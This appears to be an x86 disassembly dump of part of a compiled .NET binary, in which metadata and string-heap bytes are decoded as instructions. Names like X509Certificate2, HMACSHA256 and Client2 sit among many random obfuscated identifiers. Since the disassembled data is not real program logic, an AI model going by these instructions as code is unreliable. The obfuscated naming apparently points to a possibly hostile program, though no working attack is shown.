  407617:	05 6d 02 00 00       	add    $0x26d,%eax
  40761c:	29 01                	sub    %eax,(%ecx)
  40761e:	71 02                	jno    0x407622
  407620:	00 00                	add    %al,(%eax)
  407622:	b2 08                	mov    $0x8,%dl
  407624:	75 02                	jne    0x407628
  407626:	00 00                	add    %al,(%eax)
  407628:	db 03                	fildl  (%ebx)
  40762a:	7a 02                	jp     0x40762e
  40762c:	02 00                	add    (%eax),%al
  40762e:	06                   	push   %es
  40762f:	00 03                	add    %al,(%ebx)
  407631:	00 01                	add    %al,(%ecx)
  407633:	00 07                	add    %al,(%edi)
  407635:	00 03                	add    %al,(%ebx)
  407637:	00 02                	add    %al,(%edx)
  407639:	00 08                	add    %cl,(%eax)
  40763b:	00 05 00 01 00 09    	add    %al,0x9000100
  407641:	00 05 00 02 00 0a    	add    %al,0xa000200
  407647:	00 07                	add    %al,(%edi)
  407649:	00 01                	add    %al,(%ecx)
  40764b:	00 0b                	add    %cl,(%ebx)
  40764d:	00 07                	add    %al,(%edi)
  40764f:	00 02                	add    %al,(%edx)
  407651:	00 0c 00             	add    %cl,(%eax,%eax,1)
  407654:	09 00                	or     %eax,(%eax)
  407656:	01 00                	add    %eax,(%eax)
  407658:	0d 00 09 00 02       	or     $0x2000900,%eax
  40765d:	00 0e                	add    %cl,(%esi)
  40765f:	00 0b                	add    %cl,(%ebx)
  407661:	00 01                	add    %al,(%ecx)
  407663:	00 0f                	add    %cl,(%edi)
  407665:	00 0b                	add    %cl,(%ebx)
  407667:	00 02                	add    %al,(%edx)
  407669:	00 10                	add    %dl,(%eax)
  40766b:	00 0d 00 01 00 11    	add    %cl,0x11000100
  407671:	00 0d 00 02 00 12    	add    %cl,0x12000200
  407677:	00 0f                	add    %cl,(%edi)
  407679:	00 01                	add    %al,(%ecx)
  40767b:	00 13                	add    %dl,(%ebx)
  40767d:	00 0f                	add    %cl,(%edi)
  40767f:	00 02                	add    %al,(%edx)
  407681:	00 14 00             	add    %dl,(%eax,%eax,1)
  407684:	11 00                	adc    %eax,(%eax)
  407686:	02 00                	add    (%eax),%al
  407688:	15 00 13 00 01       	adc    $0x1001300,%eax
  40768d:	00 16                	add    %dl,(%esi)
  40768f:	00 13                	add    %dl,(%ebx)
  407691:	00 02                	add    %al,(%edx)
  407693:	00 17                	add    %dl,(%edi)
  407695:	00 15 00 01 00 18    	add    %dl,0x18000100
  40769b:	00 15 00 02 00 19    	add    %dl,0x19000200
  4076a1:	00 17                	add    %dl,(%edi)
  4076a3:	00 01                	add    %al,(%ecx)
  4076a5:	00 1a                	add    %bl,(%edx)
  4076a7:	00 17                	add    %dl,(%edi)
  4076a9:	00 02                	add    %al,(%edx)
  4076ab:	00 60 00             	add    %ah,0x0(%eax)
  4076ae:	19 00                	sbb    %eax,(%eax)
  4076b0:	02 00                	add    (%eax),%al
  4076b2:	68 00 1b 00 02       	push   $0x2001b00
  4076b7:	00 69 00             	add    %ch,0x0(%ecx)
  4076ba:	1d 00 02 00 8b       	sbb    $0x8b000200,%eax
  4076bf:	00 1f                	add    %bl,(%edi)
  4076c1:	00 01                	add    %al,(%ecx)
  4076c3:	00 8c 00 1f 00 02 00 	add    %cl,0x2001f(%eax,%eax,1)
  4076ca:	8d 00                	lea    (%eax),%eax
  4076cc:	21 00                	and    %eax,(%eax)
  4076ce:	01 00                	add    %eax,(%eax)
  4076d0:	8e 00                	mov    (%eax),%es
  4076d2:	21 00                	and    %eax,(%eax)
  4076d4:	02 00                	add    (%eax),%al
  4076d6:	8f 00                	pop    (%eax)
  4076d8:	23 00                	and    (%eax),%eax
  4076da:	01 00                	add    %eax,(%eax)
  4076dc:	90                   	nop
  4076dd:	00 23                	add    %ah,(%ebx)
  4076df:	00 02                	add    %al,(%edx)
  4076e1:	00 91 00 25 00 02    	add    %dl,0x2002500(%ecx)
  4076e7:	00 92 00 27 00 16    	add    %dl,0x16002700(%edx)
  4076ed:	00 c0                	add    %al,%al
  4076ef:	00 03                	add    %al,(%ebx)
  4076f1:	00 16                	add    %dl,(%esi)
  4076f3:	00 c2                	add    %al,%dl
  4076f5:	00 05 00 16 00 c4    	add    %al,0xc4001600
  4076fb:	00 07                	add    %al,(%edi)
  4076fd:	00 18                	add    %bl,(%eax)
  4076ff:	00 26                	add    %ah,(%esi)
  407701:	01 09                	add    %ecx,(%ecx)
  407703:	00 8b 17 7e 17 96    	add    %cl,-0x69e881e9(%ebx)
  407709:	17                   	pop    %ss
  40770a:	ef                   	out    %eax,(%dx)
  40770b:	05 5b 06 75 06       	add    $0x675065b,%eax
  407710:	9c                   	pushf
  407711:	06                   	push   %es
  407712:	ff 06                	incl   (%esi)
  407714:	27                   	daa
  407715:	07                   	pop    %es
  407716:	00 01                	add    %al,(%ecx)
  407718:	71 00                	jno    0x40771a
  40771a:	9b                   	fwait
  40771b:	24 01                	and    $0x1,%al
  40771d:	00 00                	add    %al,(%eax)
  40771f:	01 73 00             	add    %esi,0x0(%ebx)
  407722:	58                   	pop    %eax
  407723:	23 01                	and    (%ecx),%eax
  407725:	00 00                	add    %al,(%eax)
  407727:	01 75 00             	add    %esi,0x0(%ebp)
  40772a:	b2 0d                	mov    $0xd,%dl
  40772c:	02 00                	add    (%eax),%al
  40772e:	41                   	inc    %ecx
  40772f:	01 77 00             	add    %esi,0x0(%edi)
  407732:	8d 22                	lea    (%edx),%esp
  407734:	02 00                	add    (%eax),%al
  407736:	40                   	inc    %eax
  407737:	01 79 00             	add    %edi,0x0(%ecx)
  40773a:	d9 0f                	(bad) (%edi)
  40773c:	02 00                	add    (%eax),%al
  40773e:	40                   	inc    %eax
  40773f:	01 7b 00             	add    %edi,0x0(%ebx)
  407742:	f4                   	hlt
  407743:	16                   	push   %ss
  407744:	03 00                	add    (%eax),%eax
  407746:	50                   	push   %eax
  407747:	20 00                	and    %al,(%eax)
  407749:	00 2d 00 70 20 00    	add    %ch,0x207000
  40774f:	00 47 00             	add    %al,0x0(%edi)
  407752:	04 80                	add    $0x80,%al
  407754:	00 00                	add    %al,(%eax)
  407756:	01 00                	add    %eax,(%eax)
	...
  407764:	5d                   	pop    %ebp
  407765:	00 00                	add    %al,(%eax)
  407767:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  407772:	00 00                	add    %al,(%eax)
  407774:	01 00                	add    %eax,(%eax)
  407776:	6b 0a 00             	imul   $0x0,(%edx),%ecx
  407779:	00 00                	add    %al,(%eax)
  40777b:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  407786:	00 00                	add    %al,(%eax)
  407788:	01 00                	add    %eax,(%eax)
  40778a:	88 18                	mov    %bl,(%eax)
  40778c:	00 00                	add    %al,(%eax)
  40778e:	00 00                	add    %al,(%eax)
  407790:	04 00                	add    $0x0,%al
	...
  40779a:	00 00                	add    %al,(%eax)
  40779c:	cc                   	int3
  40779d:	00 29                	add    %ch,(%ecx)
  40779f:	14 00                	adc    $0x0,%al
  4077a1:	00 00                	add    %al,(%eax)
  4077a3:	00 04 00             	add    %al,(%eax,%eax,1)
  4077a6:	00 00                	add    %al,(%eax)
  4077a8:	00 00                	add    %al,(%eax)
  4077aa:	00 00                	add    %al,(%eax)
  4077ac:	70 00                	jo     0x4077ae
  4077ae:	00 00                	add    %al,(%eax)
  4077b0:	01 00                	add    %eax,(%eax)
  4077b2:	80 0f 00             	orb    $0x0,(%edi)
  4077b5:	00 00                	add    %al,(%eax)
  4077b7:	00 0a                	add    %cl,(%edx)
	...
  4077c1:	00 00                	add    %al,(%eax)
  4077c3:	00 cc                	add    %cl,%ah
  4077c5:	00 a8 0a 00 00 00    	add    %ch,0xa(%eax)
  4077cb:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4077d6:	00 00                	add    %al,(%eax)
  4077d8:	cc                   	int3
  4077d9:	00 39                	add    %bh,(%ecx)
  4077db:	22 00                	and    (%eax),%al
  4077dd:	00 00                	add    %al,(%eax)
  4077df:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4077ea:	00 00                	add    %al,(%eax)
  4077ec:	01 00                	add    %eax,(%eax)
  4077ee:	09 20                	or     %esp,(%eax)
  4077f0:	00 00                	add    %al,(%eax)
  4077f2:	00 00                	add    %al,(%eax)
  4077f4:	04 00                	add    $0x0,%al
  4077f6:	00 00                	add    %al,(%eax)
  4077f8:	00 00                	add    %al,(%eax)
  4077fa:	00 00                	add    %al,(%eax)
  4077fc:	70 00                	jo     0x4077fe
  4077fe:	00 00                	add    %al,(%eax)
  407800:	cc                   	int3
  407801:	00 9a 1b 00 00 00    	add    %bl,0x1b(%edx)
  407807:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40780a:	0b 00                	or     (%eax),%eax
  40780c:	10 00                	adc    %al,(%eax)
  40780e:	0f 00 14 00          	lldt   (%eax,%eax,1)
  407812:	13 00                	adc    (%eax),%eax
  407814:	1e                   	push   %ds
  407815:	00 1d 00 75 01 8d    	add    %bl,0x8d017500
  40781b:	06                   	push   %es
  40781c:	00 41 63             	add    %al,0x63(%ecx)
  40781f:	74 69                	je     0x40788a
  407821:	6f                   	outsl  %ds:(%esi),(%dx)
  407822:	6e                   	outsb  %ds:(%esi),(%dx)
  407823:	60                   	pusha
  407824:	31 30                	xor    %esi,(%eax)
  407826:	00 49 45             	add    %cl,0x45(%ecx)
  407829:	6e                   	outsb  %ds:(%esi),(%dx)
  40782a:	75 6d                	jne    0x407899
  40782c:	65 72 61             	gs jb  0x407890
  40782f:	62 6c 65 60          	bound  %ebp,0x60(%ebp,%eiz,2)
  407833:	31 00                	xor    %eax,(%eax)
  407835:	43                   	inc    %ebx
  407836:	61                   	popa
  407837:	6c                   	insb   (%dx),%es:(%edi)
  407838:	6c                   	insb   (%dx),%es:(%edi)
  407839:	53                   	push   %ebx
  40783a:	69 74 65 60 31 00 4c 	imul   $0x694c0031,0x60(%ebp,%eiz,2),%esi
  407841:	69 
  407842:	73 74                	jae    0x4078b8
  407844:	60                   	pusha
  407845:	31 00                	xor    %eax,(%eax)
  407847:	4d                   	dec    %ebp
  407848:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  40784f:	74 2e                	je     0x40787f
  407851:	57                   	push   %edi
  407852:	69 6e 33 32 00 54 6f 	imul   $0x6f540032,0x33(%esi),%ebp
  407859:	55                   	push   %ebp
  40785a:	49                   	dec    %ecx
  40785b:	6e                   	outsb  %ds:(%esi),(%dx)
  40785c:	74 33                	je     0x407891
  40785e:	32 00                	xor    (%eax),%al
  407860:	54                   	push   %esp
  407861:	6f                   	outsl  %ds:(%esi),(%dx)
  407862:	49                   	dec    %ecx
  407863:	6e                   	outsb  %ds:(%esi),(%dx)
  407864:	74 33                	je     0x407899
  407866:	32 00                	xor    (%eax),%al
  407868:	58                   	pop    %eax
  407869:	35 30 39 43 65       	xor    $0x65433930,%eax
  40786e:	72 74                	jb     0x4078e4
  407870:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  407877:	32 00                	xor    (%eax),%al
  407879:	43                   	inc    %ebx
  40787a:	6c                   	insb   (%dx),%es:(%edi)
  40787b:	69 65 6e 74 32 00 54 	imul   $0x54003274,0x6e(%ebp),%esp
  407882:	6f                   	outsl  %ds:(%esi),(%dx)
  407883:	55                   	push   %ebp
  407884:	49                   	dec    %ecx
  407885:	6e                   	outsb  %ds:(%esi),(%dx)
  407886:	74 36                	je     0x4078be
  407888:	34 00                	xor    $0x0,%al
  40788a:	54                   	push   %esp
  40788b:	6f                   	outsl  %ds:(%esi),(%dx)
  40788c:	49                   	dec    %ecx
  40788d:	6e                   	outsb  %ds:(%esi),(%dx)
  40788e:	74 36                	je     0x4078c6
  407890:	34 00                	xor    $0x0,%al
  407892:	54                   	push   %esp
  407893:	6f                   	outsl  %ds:(%esi),(%dx)
  407894:	55                   	push   %ebp
  407895:	49                   	dec    %ecx
  407896:	6e                   	outsb  %ds:(%esi),(%dx)
  407897:	74 31                	je     0x4078ca
  407899:	36 00 54 6f 49       	add    %dl,%ss:0x49(%edi,%ebp,2)
  40789e:	6e                   	outsb  %ds:(%esi),(%dx)
  40789f:	74 31                	je     0x4078d2
  4078a1:	36 00 48 4d          	add    %cl,%ss:0x4d(%eax)
  4078a5:	41                   	inc    %ecx
  4078a6:	43                   	inc    %ebx
  4078a7:	53                   	push   %ebx
  4078a8:	48                   	dec    %eax
  4078a9:	41                   	inc    %ecx
  4078aa:	32 35 36 00 67 65    	xor    0x65670036,%dh
  4078b0:	74 5f                	je     0x407911
  4078b2:	55                   	push   %ebp
  4078b3:	54                   	push   %esp
  4078b4:	46                   	inc    %esi
  4078b5:	38 00                	cmp    %al,(%eax)
  4078b7:	3c 4d                	cmp    $0x4d,%al
  4078b9:	6f                   	outsl  %ds:(%esi),(%dx)
  4078ba:	64 75 6c             	fs jne 0x407929
  4078bd:	65 3e 00 52 57       	gs add %dl,%ds:0x57(%edx)
  4078c2:	57                   	push   %edi
  4078c3:	5a                   	pop    %edx
  4078c4:	48                   	dec    %eax
  4078c5:	7a 68                	jp     0x40792f
  4078c7:	78 6f                	js     0x407938
  4078c9:	43                   	inc    %ebx
  4078ca:	6a 64                	push   $0x64
  4078cc:	44                   	inc    %esp
  4078cd:	41                   	inc    %ecx
  4078ce:	00 6b 70             	add    %ch,0x70(%ebx)
  4078d1:	41                   	inc    %ecx
  4078d2:	66 4c                	dec    %sp
  4078d4:	47                   	inc    %edi
  4078d5:	67 6b 6a 49 41       	imul   $0x41,0x49(%bp,%si),%ebp
  4078da:	00 51 6a             	add    %dl,0x6a(%ecx)
  4078dd:	79 4a                	jns    0x407929
  4078df:	75 53                	jne    0x407934
  4078e1:	42                   	inc    %edx
  4078e2:	6c                   	insb   (%dx),%es:(%edi)
  4078e3:	75 7a                	jne    0x40795f
  4078e5:	69 62 41 00 48 67 4b 	imul   $0x4b674800,0x41(%edx),%esp
  4078ec:	4a                   	dec    %edx
  4078ed:	75 4f                	jne    0x40793e
  4078ef:	64 6c                	fs insb (%dx),%es:(%edi)
  4078f1:	43                   	inc    %ebx
  4078f2:	58                   	pop    %eax
  4078f3:	49                   	dec    %ecx
  4078f4:	72 6b                	jb     0x407961
  4078f6:	50                   	push   %eax
  4078f7:	65 41                	gs inc %ecx
  4078f9:	00 55 55             	add    %dl,0x55(%ebp)
  4078fc:	4f                   	dec    %edi
  4078fd:	72 6a                	jb     0x407969
  4078ff:	64 45                	fs inc %ebp
  407901:	75 6d                	jne    0x407970
  407903:	4a                   	dec    %edx
  407904:	42                   	inc    %edx
  407905:	00 4f 75             	add    %cl,0x75(%edi)
  407908:	4d                   	dec    %ebp
  407909:	52                   	push   %edx
  40790a:	66 46                	inc    %si
  40790c:	74 56                	je     0x407964
  40790e:	72 48                	jb     0x407958
  407910:	64 52                	fs push %edx
  407912:	51                   	push   %ecx
  407913:	42                   	inc    %edx
  407914:	00 53 52             	add    %dl,0x52(%ebx)
  407917:	56                   	push   %esi
  407918:	74 6e                	je     0x407988
  40791a:	4c                   	dec    %esp
  40791b:	56                   	push   %esi
  40791c:	4b                   	dec    %ebx
  40791d:	53                   	push   %ebx
  40791e:	42                   	inc    %edx
  40791f:	00 6f 62             	add    %ch,0x62(%edi)
  407922:	62 46 77             	bound  %eax,0x77(%esi)
  407925:	44                   	inc    %esp
  407926:	5a                   	pop    %edx
  407927:	53                   	push   %ebx
  407928:	79 64                	jns    0x40798e
  40792a:	42                   	inc    %edx
  40792b:	00 56 62             	add    %dl,0x62(%esi)
  40792e:	45                   	inc    %ebp
  40792f:	4a                   	dec    %edx
  407930:	63 79 53             	arpl   %edi,0x53(%ecx)
  407933:	6e                   	outsb  %ds:(%esi),(%dx)
  407934:	70 65                	jo     0x40799b
  407936:	70 42                	jo     0x40797a
  407938:	00 53 4d             	add    %dl,0x4d(%ebx)
  40793b:	58                   	pop    %eax
  40793c:	6e                   	outsb  %ds:(%esi),(%dx)
  40793d:	71 4a                	jno    0x407989
  40793f:	43                   	inc    %ebx
  407940:	50                   	push   %eax
  407941:	41                   	inc    %ecx
  407942:	78 42                	js     0x407986
  407944:	00 67 44             	add    %ah,0x44(%edi)
  407947:	62 50 6a             	bound  %edx,0x6a(%eax)
  40794a:	4e                   	dec    %esi
  40794b:	45                   	inc    %ebp
  40794c:	4e                   	dec    %esi
  40794d:	67 76 7a             	addr16 jbe 0x4079ca
  407950:	42                   	inc    %edx
  407951:	00 47 43             	add    %al,0x43(%edi)
  407954:	00 7a 59             	add    %bh,0x59(%edx)
  407957:	77 75                	ja     0x4079ce
  407959:	67 72 6b             	addr16 jb 0x4079c7
  40795c:	4d                   	dec    %ebp
  40795d:	41                   	inc    %ecx
  40795e:	71 49                	jno    0x4079a9
  407960:	43                   	inc    %ebx
  407961:	00 50 49             	add    %dl,0x49(%eax)
  407964:	53                   	push   %ebx
  407965:	70 62                	jo     0x4079c9
  407967:	7a 6b                	jp     0x4079d4
  407969:	59                   	pop    %ecx
  40796a:	71 61                	jno    0x4079cd
  40796c:	4b                   	dec    %ebx
  40796d:	45                   	inc    %ebp
  40796e:	50                   	push   %eax
  40796f:	43                   	inc    %ebx
  407970:	00 77 62             	add    %dh,0x62(%edi)
  407973:	4a                   	dec    %edx
  407974:	50                   	push   %eax
  407975:	42                   	inc    %edx
  407976:	77 45                	ja     0x4079bd
  407978:	5a                   	pop    %edx
  407979:	51                   	push   %ecx
  40797a:	53                   	push   %ebx
  40797b:	69 78 5a 43 00 44 70 	imul   $0x70440043,0x5a(%eax),%edi
  407982:	4a                   	dec    %edx
  407983:	62 57 4b             	bound  %edx,0x4b(%edi)
  407986:	6a 6f                	push   $0x6f
  407988:	4f                   	dec    %edi
  407989:	64 45                	fs inc %ebp
  40798b:	69 43 00 75 47 4c 6b 	imul   $0x6b4c4775,0x0(%ebx),%eax
  407992:	61                   	popa
  407993:	4e                   	dec    %esi
  407994:	42                   	inc    %edx
  407995:	63 68 59             	arpl   %ebp,0x59(%eax)
  407998:	65 41                	gs inc %ecx
  40799a:	66 72 43             	data16 jb 0x4079e0
  40799d:	00 45 4c             	add    %al,0x4c(%ebp)
  4079a0:	74 4e                	je     0x4079f0
  4079a2:	77 59                	ja     0x4079fd
  4079a4:	66 59                	pop    %cx
  4079a6:	77 73                	ja     0x407a1b
  4079a8:	43                   	inc    %ebx
  4079a9:	00 42 4a             	add    %al,0x4a(%edx)
  4079ac:	51                   	push   %ecx
  4079ad:	48                   	dec    %eax
  4079ae:	77 6f                	ja     0x407a1f
  4079b0:	4b                   	dec    %ebx
  4079b1:	44                   	inc    %esp
  4079b2:	67 6e                	outsb  %ds:(%si),(%dx)
  4079b4:	46                   	inc    %esi
  4079b5:	41                   	inc    %ecx
  4079b6:	44                   	inc    %esp
  4079b7:	00 4d 61             	add    %cl,0x61(%ebp)
  4079ba:	70 4e                	jo     0x407a0a
  4079bc:	61                   	popa
  4079bd:	6d                   	insl   (%dx),%es:(%edi)
  4079be:	65 54                	gs push %esp
  4079c0:	6f                   	outsl  %ds:(%esi),(%dx)
  4079c1:	4f                   	dec    %edi
  4079c2:	49                   	dec    %ecx
  4079c3:	44                   	inc    %esp
  4079c4:	00 67 65             	add    %ah,0x65(%edi)
  4079c7:	74 5f                	je     0x407a28
  4079c9:	46                   	inc    %esi
  4079ca:	6f                   	outsl  %ds:(%esi),(%dx)
  4079cb:	72 6d                	jb     0x407a3a
  4079cd:	61                   	popa
  4079ce:	74 49                	je     0x407a19
  4079d0:	44                   	inc    %esp
  4079d1:	00 78 48             	add    %bh,0x48(%eax)
  4079d4:	49                   	dec    %ecx
  4079d5:	4e                   	dec    %esi
  4079d6:	46                   	inc    %esi
  4079d7:	52                   	push   %edx
  4079d8:	53                   	push   %ebx
  4079d9:	50                   	push   %eax
  4079da:	72 51                	jb     0x407a2d
  4079dc:	44                   	inc    %esp
  4079dd:	00 6d 70             	add    %ch,0x70(%ebp)
  4079e0:	42                   	inc    %edx
  4079e1:	63 59 76             	arpl   %ebx,0x76(%ecx)
  4079e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4079e5:	75 4d                	jne    0x407a34
  4079e7:	52                   	push   %edx
  4079e8:	44                   	inc    %esp
  4079e9:	00 73 68             	add    %dh,0x68(%ebx)
  4079ec:	4b                   	dec    %ebx
  4079ed:	7a 6e                	jp     0x407a5d
  4079ef:	65 49                	gs dec %ecx
  4079f1:	52                   	push   %edx
  4079f2:	6c                   	insb   (%dx),%es:(%edi)
  4079f3:	44                   	inc    %esp
  4079f4:	00 78 4b             	add    %bh,0x4b(%eax)
  4079f7:	58                   	pop    %eax
  4079f8:	46                   	inc    %esi
  4079f9:	63 53 69             	arpl   %edx,0x69(%ebx)
  4079fc:	54                   	push   %esp
  4079fd:	57                   	push   %edi
  4079fe:	65 6d                	gs insl (%dx),%es:(%edi)
  407a00:	44                   	inc    %esp
  407a01:	00 53 61             	add    %dl,0x61(%ebx)
  407a04:	66 51                	push   %cx
  407a06:	61                   	popa
  407a07:	42                   	inc    %edx
  407a08:	4b                   	dec    %ebx
  407a09:	65 74 54             	gs je  0x407a60
  407a0c:	47                   	inc    %edi
  407a0d:	43                   	inc    %ebx
  407a0e:	57                   	push   %edi
  407a0f:	4c                   	dec    %esp
  407a10:	6e                   	outsb  %ds:(%esi),(%dx)
  407a11:	44                   	inc    %esp
  407a12:	00 71 52             	add    %dh,0x52(%ecx)
  407a15:	65 43                	gs inc %ebx
  407a17:	6b 4e 79 4a          	imul   $0x4a,0x79(%esi),%ecx
  407a1b:	57                   	push   %edi
  407a1c:	75 6d                	jne    0x407a8b
  407a1e:	43                   	inc    %ebx
  407a1f:	45                   	inc    %ebp
  407a20:	00 47 7a             	add    %al,0x7a(%edi)
  407a23:	73 58                	jae    0x407a7d
  407a25:	68 71 4f 6d 71       	push   $0x716d4f71
  407a2a:	66 44                	inc    %sp
  407a2c:	45                   	inc    %ebp
  407a2d:	00 6a 51             	add    %ch,0x51(%edx)
  407a30:	6e                   	outsb  %ds:(%esi),(%dx)
  407a31:	75 4c                	jne    0x407a7f
  407a33:	54                   	push   %esp
  407a34:	59                   	pop    %ecx
  407a35:	43                   	inc    %ebx
  407a36:	4f                   	dec    %edi
  407a37:	44                   	inc    %esp
  407a38:	6c                   	insb   (%dx),%es:(%edi)
  407a39:	4c                   	dec    %esp
  407a3a:	6d                   	insl   (%dx),%es:(%edi)
  407a3b:	4f                   	dec    %edi
  407a3c:	45                   	inc    %ebp
  407a3d:	00 67 78             	add    %ah,0x78(%edi)
  407a40:	4e                   	dec    %esi
  407a41:	78 47                	js     0x407a8a
  407a43:	79 71                	jns    0x407ab6
  407a45:	42                   	inc    %edx
  407a46:	51                   	push   %ecx
  407a47:	71 6c                	jno    0x407ab5
  407a49:	58                   	pop    %eax
  407a4a:	45                   	inc    %ebp
  407a4b:	00 4a 51             	add    %cl,0x51(%edx)
  407a4e:	4a                   	dec    %edx
  407a4f:	6c                   	insb   (%dx),%es:(%edi)
  407a50:	75 44                	jne    0x407a96
  407a52:	78 47                	js     0x407a9b
  407a54:	56                   	push   %esi
  407a55:	57                   	push   %edi
  407a56:	62 45 00             	bound  %eax,0x0(%ebp)
  407a59:	42                   	inc    %edx
  407a5a:	69 4f 55 45 54 54 74 	imul   $0x74545445,0x55(%edi),%ecx
  407a61:	6c                   	insb   (%dx),%es:(%edi)
  407a62:	6e                   	outsb  %ds:(%esi),(%dx)
  407a63:	68 45 00 44 7a       	push   $0x7a440045
  407a68:	67 73 73             	addr16 jae 0x407ade
  407a6b:	4d                   	dec    %ebp
  407a6c:	4e                   	dec    %esi
  407a6d:	4b                   	dec    %ebx
  407a6e:	6a 6d                	push   $0x6d
  407a70:	75 45                	jne    0x407ab7
  407a72:	00 6f 70             	add    %ch,0x70(%edi)
  407a75:	52                   	push   %edx
  407a76:	6b 48 77 55          	imul   $0x55,0x77(%eax),%ecx
  407a7a:	75 42                	jne    0x407abe
  407a7c:	4a                   	dec    %edx
  407a7d:	71 69                	jno    0x407ae8
  407a7f:	46                   	inc    %esi
  407a80:	00 62 62             	add    %ah,0x62(%edx)
  407a83:	47                   	inc    %edi
  407a84:	52                   	push   %edx
  407a85:	64 48                	fs dec %eax
  407a87:	61                   	popa
  407a88:	4f                   	dec    %edi
  407a89:	44                   	inc    %esp
  407a8a:	41                   	inc    %ecx
  407a8b:	47                   	inc    %edi
  407a8c:	00 7a 6f             	add    %bh,0x6f(%edx)
  407a8f:	64 4e                	fs dec %esi
  407a91:	57                   	push   %edi
  407a92:	43                   	inc    %ebx
  407a93:	41                   	inc    %ecx
  407a94:	52                   	push   %edx
  407a95:	62 50 50             	bound  %edx,0x50(%eax)
  407a98:	47                   	inc    %edi
  407a99:	00 6e 4b             	add    %ch,0x4b(%esi)
  407a9c:	6d                   	insl   (%dx),%es:(%edi)
  407a9d:	6d                   	insl   (%dx),%es:(%edi)
  407a9e:	6f                   	outsl  %ds:(%esi),(%dx)
  407a9f:	65 4f                	gs dec %edi
  407aa1:	53                   	push   %ebx
  407aa2:	47                   	inc    %edi
  407aa3:	42                   	inc    %edx
  407aa4:	62 69 52             	bound  %ebp,0x52(%ecx)
  407aa7:	47                   	inc    %edi
  407aa8:	00 6c 71 68          	add    %ch,0x68(%ecx,%esi,2)
  407aac:	71 63                	jno    0x407b11
  407aae:	44                   	inc    %esp
  407aaf:	45                   	inc    %ebp
  407ab0:	4a                   	dec    %edx
  407ab1:	64 45                	fs inc %ebp
  407ab3:	52                   	push   %edx
  407ab4:	5a                   	pop    %edx
  407ab5:	47                   	inc    %edi
  407ab6:	00 6e 49             	add    %ch,0x49(%esi)
  407ab9:	4a                   	dec    %edx
  407aba:	6a 59                	push   $0x59
  407abc:	43                   	inc    %ebx
  407abd:	42                   	inc    %edx
  407abe:	57                   	push   %edi
  407abf:	4f                   	dec    %edi
  407ac0:	7a 63                	jp     0x407b25
  407ac2:	76 72                	jbe    0x407b36
  407ac4:	47                   	inc    %edi
  407ac5:	00 4e 4a             	add    %cl,0x4a(%esi)
  407ac8:	4a                   	dec    %edx
  407ac9:	64 59                	fs pop %ecx
  407acb:	68 75 44 44 53       	push   $0x53444475
  407ad0:	76 47                	jbe    0x407b19
  407ad2:	00 78 69             	add    %bh,0x69(%eax)
  407ad5:	70 6f                	jo     0x407b46
  407ad7:	48                   	dec    %eax
  407ad8:	56                   	push   %esi
  407ad9:	79 55                	jns    0x407b30
  407adb:	47                   	inc    %edi
  407adc:	48                   	dec    %eax
  407add:	00 7a 56             	add    %bh,0x56(%edx)
  407ae0:	69 55 46 59 52 53 41 	imul   $0x41535259,0x46(%ebp),%edx
  407ae7:	55                   	push   %ebp
  407ae8:	49                   	dec    %ecx
  407ae9:	48                   	dec    %eax
  407aea:	00 43 67             	add    %al,0x67(%ebx)
  407aed:	53                   	push   %ebx
  407aee:	77 6b                	ja     0x407b5b
  407af0:	68 62 43 4c 41       	push   $0x414c4362
  407af5:	45                   	inc    %ebp
  407af6:	56                   	push   %esi
  407af7:	75 55                	jne    0x407b4e
  407af9:	48                   	dec    %eax
  407afa:	00 72 4a             	add    %dh,0x4a(%edx)
  407afd:	65 75 57             	gs jne 0x407b57
  407b00:	4f                   	dec    %edi
  407b01:	6d                   	insl   (%dx),%es:(%edi)
  407b02:	69 6a 5a 48 00 56 6c 	imul   $0x6c560048,0x5a(%edx),%ebp
  407b09:	77 53                	ja     0x407b5e
  407b0b:	6a 42                	push   $0x42
  407b0d:	50                   	push   %eax
  407b0e:	6b 59 4f 52          	imul   $0x52,0x4f(%ecx),%ebx
  407b12:	62 48 00             	bound  %ecx,0x0(%eax)
  407b15:	64 4f                	fs dec %edi
  407b17:	61                   	popa
  407b18:	6a 5a                	push   $0x5a
  407b1a:	6e                   	outsb  %ds:(%esi),(%dx)
  407b1b:	5a                   	pop    %edx
  407b1c:	4f                   	dec    %edi
  407b1d:	4c                   	dec    %esp
  407b1e:	56                   	push   %esi
  407b1f:	77 48                	ja     0x407b69
  407b21:	00 4f 61             	add    %cl,0x61(%edi)
  407b24:	48                   	dec    %eax
  407b25:	51                   	push   %ecx
  407b26:	59                   	pop    %ecx
  407b27:	76 42                	jbe    0x407b6b
  407b29:	78 46                	js     0x407b71
  407b2b:	6f                   	outsl  %ds:(%esi),(%dx)
  407b2c:	42                   	inc    %edx
  407b2d:	49                   	dec    %ecx
  407b2e:	00 78 51             	add    %bh,0x51(%eax)
  407b31:	6b 48 62 74          	imul   $0x74,0x62(%eax),%ecx
  407b35:	59                   	pop    %ecx
  407b36:	74 5a                	je     0x407b92
  407b38:	63 43 49             	arpl   %eax,0x49(%ebx)
  407b3b:	00 47 42             	add    %al,0x42(%edi)
  407b3e:	78 48                	js     0x407b88
  407b40:	57                   	push   %edi
  407b41:	4a                   	dec    %edx
  407b42:	48                   	dec    %eax
  407b43:	6b 74 43 49 00       	imul   $0x0,0x49(%ebx,%eax,2),%esi
  407b48:	67 65 74 5f          	addr16 gs je 0x407bab
  407b4c:	41                   	inc    %ecx
  407b4d:	53                   	push   %ebx
  407b4e:	43                   	inc    %ebx
  407b4f:	49                   	dec    %ecx
  407b50:	49                   	dec    %ecx
  407b51:	00 72 54             	add    %dh,0x54(%edx)
  407b54:	59                   	pop    %ecx
  407b55:	6b 64 77 49 56       	imul   $0x56,0x49(%edi,%esi,2),%esp
  407b5a:	65 44                	gs inc %esp
  407b5c:	4c                   	dec    %esp
  407b5d:	66 49                	dec    %cx
  407b5f:	00 58 6b             	add    %bl,0x6b(%eax)
  407b62:	61                   	popa
  407b63:	41                   	inc    %ecx
  407b64:	75 63                	jne    0x407bc9
  407b66:	48                   	dec    %eax
  407b67:	70 6c                	jo     0x407bd5
  407b69:	68 50 54 71 49       	push   $0x49715450
  407b6e:	00 67 57             	add    %ah,0x57(%edi)
